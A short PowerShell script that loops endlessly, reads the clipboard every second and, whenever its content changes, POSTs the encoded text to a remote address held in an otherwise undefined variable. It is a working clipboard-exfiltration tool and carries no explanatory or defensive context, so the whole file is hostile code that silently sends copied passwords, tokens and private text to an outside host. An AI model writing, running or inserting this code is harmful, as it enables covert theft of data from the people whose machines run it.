$previousContent = ""

while ($true) {
  $currentContent = Get-Clipboard

    if ($currentContent -ne $previousContent) {
        $encodeText = [System.Text.Encoding]::UTF8.GetBytes($currentContent)
        Invoke-RestMethod -Uri $targetRemote -Method Post -Body $encodeText

        $previousContent = $currentContent
    }

  Start-Sleep -Seconds 1
}
